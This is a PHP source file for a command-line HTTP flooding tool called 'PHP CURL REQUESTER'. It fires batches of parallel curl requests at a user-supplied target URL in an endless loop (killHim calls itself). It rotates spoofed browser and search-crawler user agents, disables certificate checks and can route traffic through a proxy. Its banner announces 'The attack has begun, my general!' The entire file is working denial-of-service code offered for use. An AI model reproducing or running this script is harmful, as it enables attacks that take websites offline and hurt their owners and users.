<?php

define("DEFAULT_PACKAGES_NUM", 100);
define("DEFAULT_PROXY_PORT", 8080);

class Reques1er {

    private $url, $packages, $proxyUrl, $proxyLogin, $proxyPass, $proxyPort, $userAgents = array(
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)',
        'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
        'Mozilla/4.08 (compatible; MSIE 6.0; Windows NT 5.1)',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
        'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
        'Twitterbot/1.0',
        'facebookexternalhit/1.1 (+https://www.facebook.com/externalhit_uatext.php)'
    ), $mh, $verbose;

    public function __construct()
    {
        $this->banner();
        $options = getopt("h::v::",["url:", "packages::", "proxy::", "proxy-login::", "proxy-pass::", "proxy-port::", "help::", "verbose::"]);
        $this->url = (empty($options['url'])) ? $this->generateError("error", "required option '--url' is missing") : $options['url'];
        $this->packages = (empty($options['packages'])) ? DEFAULT_PACKAGES_NUM : $options['packages'];
        $this->verbose = (array_key_exists('v', $options) || array_key_exists('verbose', $options)) ? true : null;
        $this->proxyUrl = (empty($options['proxy'])) ? null : $options['proxy'];
        $this->proxyLogin = (empty($options['proxy-login'])) ? null : $options['proxy-login'];
        $this->proxyPass = (empty($options['proxy-pass'])) ? null : $options['proxy-pass'];
        $this->proxyPort = (empty($options['proxy-port'])) ? DEFAULT_PROXY_PORT : $options['proxy-port'];

        if(array_key_exists('h', $options) || array_key_exists('help', $options)) {
            $this->help();
        } else {
            $this->attackRunBanner();
            $this->killHim();
        }
    }

    public function banner() {
        echo "================================\n\r";
        echo "\n\r";
        echo "     PHP CURL REQUESTER v0.1\r\n";
        echo "\n\r";
        echo "================================\n\r";
        echo "\n\r";
    }

    public function attackRunBanner() {
        echo "\r\n";
        echo " >>> The attack has begun, my general! \r\n";
        echo "\r\n";
        echo "\r\n";
    }
    private function registerMasterHandle() {
        $this->mh = curl_multi_init();
    }

    private function help() {
        echo "\r\n";
        echo " ------ HELP ------ \r\n";
        echo " [-] Option: --url Desc: Set target url. REQUIRED! Ex. --url=https://google.com \r\n";
        echo "\r\n";
        echo " [-] Option: --packages Desc: Set number of packages to send (in one session). Ex. --packages=80 Default: 100 \r\n";
        echo " [-] Option: --help Alias: -h Desc: Show help info. Ex. --help OR -h\r\n";
        echo " [-] Option: --verbose Alias: -v Desc: Show verbose output. Ex. --verbose OR -v\r\n";
        echo "\r\n";
        echo " [-] Option: --proxy Desc: Set proxy address. Ex. --proxy=5.24.8.26 \r\n";
        echo " [-] Option: --proxy-login Desc: Set proxy login. Ex. --proxy-login=username \r\n";
        echo " [-] Option: --proxy-pass Desc: Set proxy password. Ex. --proxy-pass=123456 \r\n";
        echo " [-] Option: --proxy-port Desc: Set proxy port. Ex. --proxy-port=1459 Default: 8080 \r\n";
        echo "\r\n";

        exit();
    }

    private function proxy($handle) {
        if($this->proxyUrl !== null) {
            curl_setopt($handle, CURLOPT_PROXYPORT, $this->proxyPort);
            curl_setopt($handle, CURLOPT_PROXYTYPE, 'HTTP');
            curl_setopt($handle, CURLOPT_PROXY, $this->proxyUrl);
            curl_setopt($handle, CURLOPT_PROXYUSERPWD, $this->proxyLogin.":".$this->proxyPass);
        }

        return $handle;
    }

    private function verboseMode($handle) {
        if($this->verbose !== null) {
            curl_setopt($handle, CURLOPT_VERBOSE, true);
        }

        return $handle;
    }

    public function registerHandles() {
        for($i = 0; $i < $this->packages; $i++) {
            ${'ch_'.$i} = curl_init();
            curl_setopt(${'ch_'.$i}, CURLOPT_HTTPHEADER, array(
                'Connection: Keep-Alive',
                'Keep-Alive: 300'
            ));
            curl_setopt(${'ch_'.$i}, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt(${'ch_'.$i}, CURLOPT_RETURNTRANSFER, true);
            curl_setopt(${'ch_'.$i}, CURLOPT_USERAGENT, $this->userAgents[array_rand($this->userAgents,1)]);
            curl_setopt(${'ch_'.$i}, CURLOPT_URL, $this->url);

            curl_multi_add_handle($this->mh, $this->verboseMode($this->proxy(${'ch_'.$i})));
        }
    }

    public function killHim() {
        $this->registerMasterHandle();
        $this->registerHandles();

        do {
            $status = curl_multi_exec($this->mh, $active);
            if ($active) {
                curl_multi_select($this->mh);
            }
        } while ($active && $status == CURLM_OK);

        $this->killHim();
    }

    private function generateError($type, $error) {
        echo "\n\r";
        echo "  [x] {$type} >>> {$error}\r\n";
        echo "\n\r";

        return ($error === "error") ? exit() : null;
    }
}

$killer = new Reques1er();

?>